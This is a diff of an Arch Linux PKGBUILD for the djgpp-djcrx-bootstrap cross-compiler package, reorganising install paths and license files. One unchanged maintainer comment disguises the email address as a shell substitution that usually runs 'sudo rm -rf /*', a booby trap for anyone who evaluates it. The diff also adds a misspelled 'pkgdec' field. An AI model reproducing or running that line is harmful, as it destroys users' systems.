@@ -1,13 +1,19 @@
+# Maintainer: Andris Pavenis <andris.pavenis@iki.fi>
 # Maintainer: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 # Originally adapted from the djgpp-crx package in AUR3; the submitter was "Schala".
 
+###############################################################################
+# Only intended for initial bootstrapping of djgpp-gcc. Use package djgpp-djcrx
+# after it instead of this package (including for next builds of djgpp-gcc)
+###############################################################################
+
 pkgname=djgpp-djcrx-bootstrap
 pkgver=2.05
-pkgrel=1
-pkgdesc="Headers for bootstrapping the djgpp cross-compiler"
-arch=(i686 x86_64)
+pkgrel=2
+pkgdec="DJGPP C library and development files for initial bootstrapping djgpp-gcc"
+arch=('i686' 'x86_64')
+provides=(djgpp-djcrx)
 url="http://www.delorie.com/djgpp/"
-depends=('glibc')
 license=(GPL LGPL custom:djgpp)
 source=(
 	"http://www.delorie.com/pub/djgpp/current/v2/djcrx${pkgver//./}.zip"
@@ -25,13 +31,15 @@ build() {
 }
 
 package() {
-	install -dm 0755 "$pkgdir/usr/$_target_alias"
-	cp -r "$srcdir/include" "$pkgdir/usr/$_target_alias"
+	install -dm 0755 "$pkgdir/usr/$_target_alias"/sys-include
+	cp -r "$srcdir/include"/* "$pkgdir/usr/$_target_alias"/sys-include/
 	cp -r "$srcdir/lib"     "$pkgdir/usr/$_target_alias"
 
 	for _file in stubedit stubify; do
-		install -Dm 0755 "$srcdir/$_file" "$pkgdir/usr/$_target_alias/bin/$_file"
+		install -Dm 0755 "$srcdir/$_file" "$pkgdir/usr/bin/$_file"
 	done
 
-	install -Dm644 "$srcdir/copying.dj" "$pkgdir/usr/share/licenses/$pkgname/copying.dj"
+	for file in copying copying.dj copying.lib readme.1st; do
+	    install -Dm644 ${file} ${pkgdir}/usr/share/licenses/$pkgname/${file}
+	done
 }
